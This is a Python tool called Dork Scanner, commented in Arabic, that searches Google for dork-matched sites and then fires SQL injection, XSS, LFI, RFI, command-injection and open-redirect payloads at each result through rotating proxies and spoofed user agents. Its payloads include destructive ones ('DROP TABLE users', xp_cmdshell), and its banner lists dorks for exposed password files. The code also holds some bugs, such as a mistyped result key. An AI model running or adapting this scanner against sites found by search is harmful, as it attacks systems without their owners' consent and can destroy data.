"""
program py : Mohamed Fouad
"""
###############################################################|
import os                             #                        |
import sys                             #                       |
import time                             #                      |
import random                            #                     |
import logging                            #                    |
import requests                            #                   |
from tabulate import tabulate               #                  |
from datetime import datetime                #                 |
from termcolor import colored                 #                |
from googlesearch import search                #               |
from functools import lru_cache                 #              |
from pyfiglet import figlet_format               #             |
from colorama import Fore, Style, Back, init      #            |
from concurrent.futures import ThreadPoolExecutor  #           |
###############################################################|


#############################
                            #
# تهيئة مكتبة colorama      #
                            #
init(autoreset=True)        #
                            #
                            #
#############################

#############################
                            #
                            #
"""                         #
 قائمة الألوان              #
"""                         #
COLORS = [                  #
    Fore.LIGHTBLUE_EX,      #
    Fore.BLUE,              #
    Fore.CYAN,              #
    Fore.LIGHTCYAN_EX,      #
    Fore.LIGHTMAGENTA_EX,   #
    Fore.GREEN,             #
    Fore.RED,               #
    Fore.LIGHTYELLOW_EX,    #
    Fore.LIGHTGREEN_EX,     #
    Fore.LIGHTRED_EX,       #
    Fore.MAGENTA,           #
    Fore.YELLOW,            #
    Fore.WHITE,             #
    Fore.LIGHTBLACK_EX      #
]                           #
                            #
                            #
############################

#################################################################################################################################################
                                                                                                                                                 #
# قائمة درجات اللون الأزرق                                                                                                                       #
BLUE_SHADES = [Fore.LIGHTBLUE_EX, Fore.BLUE, Fore.CYAN]                                                                                          #
                                                                                                                                                 #
# قائمة User Agents                                                                                                                              #
USER_AGENTS = [                                                                                                                                  #
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",                       #
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",                 #
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",                                 #
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",                                                                     #
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"                                                         #
]                                                                                                                                                #
                                                                                                                                                 #
#################################################################################################################################################

###############################################################################################################
                                                                                                               #
# قائمة بروكسيات                                                                                               #
PROXIES = [                                                                                                    #
    {"http": "http://51.79.50.22:9300"},                                                                       #
    {"http": "http://68.183.221.27:8080"},                                                                     #
    {"http": "http://139.59.1.14:3128"}                                                                        #
]                                                                                                              #
                                                                                                               #
###############################################################################################################

###############################################################################################################
                                                                                                               #
# إعداد سجل الأخطاء                                                                                            #
logging.basicConfig(filename="dork_scanner.log", level=logging.INFO, format="%(asctime)s - %(message)s")       #
                                                                                                               #
###############################################################################################################

##########################################################
def random_headers():                                     #
    """توليد عناوين عشوائية لتجنب الحظر."""               #
    return {"User-Agent": random.choice(USER_AGENTS)}     #
                                                          #
##########################################################

#####################################################################################
@lru_cache(maxsize=130)                                                              #
def send_request(url):                                                               # @lru_cache(maxsize=128)
    """إرسال طلب HTTP مع حقول رأس وبروكسي عشوائي."""                                 #
    proxy = random.choice(PROXIES)                                                   #
    headers = random_headers()                                                       #
    try:                                                                             #
        return requests.get(url, headers=headers, proxies=proxy, timeout=15)         #
    except Exception as e:                                                           #
        logging.error(f"Failed to connect to {url}: {e}")                            #
        return None                                                                  #
                                                                                     #
#####################################################################################

##############################################################  EXIT  ############################################################
def check_exit_condition(value):                                                                                                  #
    """التحقق إذا كان المستخدم قد أدخل 0 أو exit أو أي من القيم الأخرى لإغلاق المشروع."""                                         #
    exit_conditions = ["0", "exit", "Exit","mohamed",  "quit", "Quit", "close", "Close", "stop", "Stop", "x", "X", "z", "Z"]      #
                                                                                                                                  #
    if value.lower() in exit_conditions:                                                                                          #
        print(Fore.BLUE + "[!] Dork_Scanner")                                                                                     #
        print(Fore.LIGHTRED_EX  + "        Palestine is Free 🍉    " )                                                            #
        print(Fore.LIGHTBLUE_EX  + "   Developed : Mohamed Fouad 🇪🇬  " )                                                          #
        print(Fore.LIGHTMAGENTA_EX + "[$] Thank you for using Dork Scanner!\n Goodbye!")                                          #
        sys.exit()                                                                                                                #
                                                                                                                                  #
##################################################################################################################################

#############################################################################
def send_requests_concurrently(links):                                       #
    """إرسال الطلبات بشكل متوازي لتحسين الأداء."""                           #
    with ThreadPoolExecutor(max_workers=15) as executor:                     #
        results = list(executor.map(analyze_vulnerability, links))           #
    return results                                                           #
                                                                             #
#############################################################################

#####################################  SQL INJECTION  ###########################################
                                                                                                 #
def check_sql_injection(link):                                                                   #
    payloads = [                                                                                 #
        "'",                                                                                     #
        "' OR 1=1 --",                                                                           #
        "' OR 'a'='a",                                                                           #
        "' UNION SELECT null, null, null --",                                                    #
        "' DROP TABLE users --",                                                                 #
        "'; EXEC xp_cmdshell('net user'); --"                                                    #
    ]                                                                                            #
                                                                                                 #
    for payload in payloads:                                                                     #
        response = send_request(link + payload)                                                  #
        if response and ("sql" in response.text.lower() or "mysql" in response.text.lower()):    #
            return True                                                                          #
    return False                                                                                 #
#################################################################################################

def check_xss(link):
    payloads = [
        "<script>alert('Mohamed')</script>",
        "'\"><script>alert('Mohamed')</script>",
        "<img src=x onerror=alert('Mohamed')>",
        "'><script>alert(1)</script>"
    ]
    for payload in payloads:
        response = send_request(link + payload)
        if response and payload in response.text:
            return True
    return False


def check_lfi(link):
    payloads = ["../../../../etc/passwd", "/etc/passwd%00"]
    for payload in payloads:
        response = send_request(link + payload)
        if response and "root:x:" in response.text:
            return True
    return False

def check_rfi(link):
    """فحص Remote File Inclusion."""
    payload = "http://example.com/malicious.txt"
    response = send_request(link + payload)
    return response and "malicious.txt" in response.text

def check_command_injection(link):
    """فحص Command Injection."""
    payloads = ["; whoami", "&& ls"]
    for payload in payloads:
        response = send_request(link + payload)
        if response and "root" in response.text.lower():
            return True
    return False

def check_open_redirect(link):
    """فحص Open Redirect."""
    payload = "?redirect=http://malicious.com"
    response = send_request(link + payload)
    return response and "http://malicious.com" in response.url

def analyze_vulnerability(link):
    """تحليل الرابط لاكتشاف الثغرات."""
    # قائمة الثغرات المكتشفة
    vulnerabilities = []

    # التحقق من الثغرات
    if check_sql_injection(link):
        vulnerabilities.append(
            ("SQL Injection", 
             f"Add [ ' OR 1=1 -- ] or [ ' ] to the URL\nExample payload: {link}' OR 1=1 --")
        )
    if check_xss(link):
        vulnerabilities.append(
            ("XSS", 
             f"Use [ <script>alert('mohamed')</script> ]\nExample payload: {link}<script>alert('mohamed')</script>")
        )
    if check_lfi(link):
        vulnerabilities.append(
            ("LFI", 
             f"Add [ /etc/passwd ] to the URL\nExample payload: {link}../../../../etc/passwd")
        )
    if check_rfi(link):  # تم تصحيح الوظيفة هنا
        vulnerabilities.append(
            ("RFI", 
             f"Add [ malicious.txt ] to the URL\nExample payload: {link}http://example.com/malicious.txt")
        )
    if check_command_injection(link):
        vulnerabilities.append(
            ("Command Injection", 
             f"Detection method: Try appending system commands like [ ; whoami ]\nExample payload: {link}; whoami")
        )
    if check_open_redirect(link):
        vulnerabilities.append(
            ("Open Redirect", 
             f"Detection method: Try adding a redirect URL like [ ?redirect=http://malicious.com ]\nExample payload: {link}?redirect=http://malicious.com")
        )

    # إذا تم اكتشاف أي ثغرات
    if vulnerabilities:
        return {"link": link, "vulnerabilities": vulnerabilities}
    else:
        # في حال عدم وجود ثغرات
        return {"link": link, "vulnerabilities": [("No vulnerabilities detected", "")]}


def display_results(results):
    """عرض النتائج بشكل جدول مع دعم كامل للألوان والتنسيق."""
    # تعريف ألوان الثغرات
    vulnerability_colors = {
        "SQL Injection": Fore.BLUE,
        "XSS": Fore.CYAN,
        "LFI": Fore.RED,
        "RFI": Fore.YELLOW,
        "Command Injection": Fore.MAGENTA,
        "Open Redirect": Fore.LIGHTRED_EX,
        "No vulnerabilities detected": Fore.LIGHTGREEN_EX,
    }

    # إعداد البيانات للعرض
    table_data = []
    for result in results:
        link = result["link"]
        for vuln, example in result["vulnerabilities"]:
            # اختيار اللون المناسب لكل ثغرة
            color = vulnerability_colors.get(vuln, Fore.LIGHTWHITE_EX)
            # إضافة البيانات إلى الجدول
            table_data.append([BLUE_SHADES[0] + link, color + vuln, example])

    # رؤوس الجدول
    table_headers = [
        BLUE_SHADES[1] + "Link",
        BLUE_SHADES[2] + "Vulnerability",
        BLUE_SHADES[0] + "Example",
    ]

    # طباعة الجدول
    print("\n" + tabulate(table_data, headers=table_headers, tablefmt="grid"))


def save_results_to_file(results):

    print(BLUE_SHADES[1] + "\n[+] Choose the file format to save the results:")
    print(BLUE_SHADES[2] + "1. TXT")
    print(BLUE_SHADES[0] + "2. CSV")
    print(Fore.LIGHTBLUE_EX + "3. JSON")
    print(Fore.LIGHTCYAN_EX + "4. XML")
    print(Fore.CYAN + "5. HTML")
    print(Fore.RED + "6. Exit")

    while True:
        file_format = input(colored("[*] Enter your choice: ", "cyan")).strip()
        if file_format in {"1", "2", "3", "4", "5", "6"}:
            break
        print(colored("[!] Invalid choice. Please select a valid option.", "red"))

    file_name = input(colored("[*] Enter the file name: ", "cyan")).strip()
    if not file_name:
        file_name = f"Dork_Scanner_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    while True:
        save_path = input(colored("[*] Enter the save path: ", "cyan")).strip()
        if not save_path:
            save_path = os.getcwd()
        if os.path.isdir(save_path):
            break
        print(colored("[!] Invalid path. Please enter a valid directory.", "red"))

    file_extensions = { "1": "txt", "2": "csv", "3": "json", "4": "xml", "5": "html" }
    file_path = os.path.join(save_path, f"{file_name}.{file_extensions[file_format]}")

    try:
        if file_format == "1":  # TXT
            with open(file_path, "w") as file:
                for result in results:
                    file.write(f"Link: {result['link']}\n")
                    for vuln, example in result["vulnerabilities_Dork_Scanner!"]:
                        file.write(f" - Vulnerability: {vuln}\n")
                        file.write(f" - Example: {example}\n")
                    file.write("\n")

        elif file_format == "2":  # CSV
            import csv
            with open(file_path, "w", newline="") as file:
                writer = csv.writer(file)
                writer.writerow(["Link", "Vulnerability", "Example"])
                for result in results:
                    for vuln, example in result["vulnerabilities"]:
                        writer.writerow([result["link"], vuln, example])

        elif file_format == "3":  # JSON
            import json
            with open(file_path, "w") as file:
                json.dump(results, file, indent=4)

        elif file_format == "4":  # XML
            from xml.etree.ElementTree import Element, SubElement, tostring, ElementTree
            root = Element("results")
            for result in results:
                link_elem = SubElement(root, "link", url=result["link"])
                for vuln, example in result["vulnerabilities_Dork_Scanner!"]:
                    vuln_elem = SubElement(link_elem, "vulnerability", type=vuln)
                    vuln_elem.text = example
            tree = ElementTree(root)
            tree.write(file_path, encoding="utf-8", xml_declaration=True)


        elif file_format == "5":  # HTML
            with open(file_path, "w") as file:
                file.write("<html><body><h1>Vulnerability Report ( Dork_Scanner )</h1><ul>")
                for result in results:
                    file.write(f"<li><strong>Link:</strong> {result['link']}<ul>")
                    for vuln, example in result["vulnerabilities"]:
                        file.write(f"<li><strong>{vuln}:</strong> {example}</li>")
                    file.write("</ul></li>")
                file.write("</ul></body></html>")


        elif file_format == "6":
            print(Fore.RED + "[!] Dork Scanner")
            print(Fore.LIGHTRED_EX  + "        Palestine is Free 🍉     " )
            print(Fore.LIGHTBLUE_EX  + "   Developed : Mohamed Fouad 🇪🇬  " )
            print(Fore.LIGHTMAGENTA_EX + "[$] Thank you for using Dork Scanner! \nGoodbye!")
            sys.exit()

        print(Fore.GREEN + "[+] Results saved successfully as {file_path}")
        
    except Exception as e:
        print(Fore.RED + "[!] Error occurred while saving the file: {str(e)}")


def main():
    """الدالة الرئيسية لبدء الفحص."""
    banner_color = random.choice(COLORS)

    print(banner_color + figlet_format("     Dork Scanner ", font="slant"))
    print(Fore.BLUE + """
            
     [+] About This Tool:

             [0] This is a Dork Search Tool designed to identify vulnerable websites by scanning links.'


    [+] Commands to Exit:
            [0] Type any of the following commands to exit the program:

              'exit', '0', 'quit', 'close', 'stop', 'z'

    [+] Vulnerabilities Detected:
            [0] The tool detects vulnerabilities such as:

                [1] Local File Inclusion (LFI)
                [2] Cross-Site Scripting (XSS)
                [3] SQL Injection (SQLi)
                [4] RFI
                [5] Command Injection
                [6] Open Redirect



    [+] Example Dorks:
            [0] Use these dorks to find potential vulnerabilities:

           - index.php?id=

           - htmltonuke.php?filnavn=

           - htpasswd

           - htpasswd / htgroup

           - htpasswd / htpasswd.bak

           - humor.php?id=

           - constructies/product.php?id=

           - head.php?pollname=

           - e_board/modifyform.html?code=

           - filetype:netrc password

           - filetype:ns1 ns1

           - filetype:ora ora

           - inurl:news-full.php?id=

           - inurl:news_display.php?getid=

           - inurl:index2.php?option=

           - inurl:readnews.php?id=

           - inurl:newsticker_info.php?idn=

           - home.php?ID=

           - db/CART/product_details.php?product_id=



    [+] Choose the file format to save the results:

          [1] TXT

          [2] CSV

          [3] JSON

          [4] XML

          [5] HTML



            [+] Have Fun

""")

    
    print(Fore.LIGHTRED_EX + "        Palestine is Free 🍉  " + Style.RESET_ALL)
    print(Fore.LIGHTBLUE_EX  + "   Developed : Mohamed Fouad 🇪🇬 \n " + Style.RESET_ALL)
    dork_query = input(BLUE_SHADES[0] + "[*] Enter the dork query: ")
    check_exit_condition(dork_query)
    num_results = input(BLUE_SHADES[2] + "[*] Number of results to fetch (default >> 10): ")
    check_exit_condition(num_results)
    num_results = int(num_results) if num_results else 50

    print(BLUE_SHADES[1] + "[*] Searching for links....")
    links = [link for link in search(dork_query, num_results=num_results)]

    print(BLUE_SHADES[0] + f"[*] Found {len(links)} links. Starting vulnerability analysis....")

    results = send_requests_concurrently(links)
    results = [res for res in results if res["vulnerabilities"][0][0] != "No vulnerabilities detected"]

    if results:
        display_results(results)
        save_results_to_file(results)
    else:
        print(Fore.RED + "[*] No vulnerabilities found.(0__0)")
    print(Fore.LIGHTRED_EX  + "        Palestine is Free 🍉     " )
    print(Fore.LIGHTBLUE_EX + Back.LIGHTWHITE_EX + "   Developed : Mohamed Fouad 🇪🇬   ")
    print(Fore.LIGHTMAGENTA_EX + Back.LIGHTWHITE_EX + "   Thank you for using Dork Scanner! \n      Goodbye!")

if __name__ == "__main__":
    main()
